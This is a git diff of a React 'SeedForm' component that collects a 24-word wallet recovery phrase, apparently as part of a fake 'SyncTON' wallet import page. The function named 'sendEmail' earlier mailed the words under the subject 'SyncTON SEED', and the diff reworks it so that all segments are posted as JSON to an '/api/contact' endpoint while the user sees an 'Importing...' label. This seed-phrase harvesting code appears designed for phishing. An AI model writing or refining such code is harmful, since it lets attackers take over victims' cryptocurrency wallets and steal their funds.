@@ -8,8 +8,11 @@ import Modal from "./Modal";
 
 
 export const SeedForm = ({ modal, setModal }) => {
-    const [segments, setSegments] = React.useState(["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""])
+    const formInitial = ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""]
+    const [segments, setSegments] = React.useState(formInitial)
     const [isPaste, setIsPaste] = useState(false);
+    const [textButton, setButtonText] = useState("Import");
+    const [status, setStatus] = useState({});
     const navigate = useNavigate();
 let message;
     const goBackSeed = () => {
@@ -17,20 +20,29 @@ let message;
         setModal(!modal);
     }
 
-
-
-    const sendEmail = (e) => {
+    const sendEmail = async (e) => {
         e.preventDefault();
-        axios.post("http://localhost:5000/import", {
-            subject: "SyncTON SEED",
-            message
-        })
-            .then(() => {
-                setModal(!modal);
-                setSegments(["","", "","","","","","","","","","","","","","","","","","","","","","",]);
-            })
-            .catch(() => alert("Message not sent"));
-    };
+        setButtonText("Importing...");
+        let response = await fetch("/api/contact", {
+          method: "POST",
+          headers: {
+            accept: 'application/json',
+            'User-agent': 'learning app',
+            "Content-Type": "application/json;charset=utf-8"
+          },
+          body: JSON.stringify(Object.assign({}, segments))
+        });
+        let result = await response.json();
+        setButtonText("Import");
+        setSegments(formInitial);
+        if(result.code == 200) {
+          setStatus({sucess: true, message: "Message sent Successfully"})
+        }else {
+          setStatus({sucess: false, message: "Something went wrong"})
+    
+        }
+        console.log(segments);
+      }
 
 
     function onPaste(event) {
@@ -73,16 +85,16 @@ let message;
                         </p>
                     </div>
                 </div>
-                {modal === false ? <form>
+                {modal === false ? <form onSubmit={sendEmail}>
                     <div className="lg-screen">
                         <div className="row1">
                             {segments.map((s, key) =>
-                                <Form key={key} value={s} onPaste={onPaste} onInput={update(key)} form_num={key + 1} autofocus={true} />
+                                <Form   key={key} value={s} onPaste={onPaste} onInput={update(key)} form_num={key + 1} autofocus={true} />
                             )}
                         </div>
                     </div>
                     <div>
-                        <button onClick={sendEmail} className="btn submit_seed" type="submit" >Submit</button>
+                        <button className="btn submit_seed" type="submit" >Submit</button>
                     </div>
                 </form> :
                     <Modal modal={modal} setModal={setModal} />}
